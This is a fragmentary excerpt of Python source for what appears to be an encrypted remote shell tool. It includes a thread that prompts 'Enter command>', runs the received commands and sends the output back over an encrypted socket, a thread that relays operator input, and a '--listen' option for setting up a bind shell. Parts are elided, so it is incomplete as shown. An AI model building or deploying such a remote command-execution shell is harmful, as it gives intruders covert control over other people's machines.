...
def shell_thread(s):
    s.encrypted_send(s, b"[ -- Connected! -- ]")

    try:
        while True:
            s.encrypted_send(s, b"\r\nEnter command> ")
            ...
            s.encrypted_send(s, execute_cmd(buffer))
    except:
        s.close()
        exit()
...
def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()
...
parser.add_argument(
    "-l", "--listen", action="store_true", help="Set up a bind shell", required=False
)
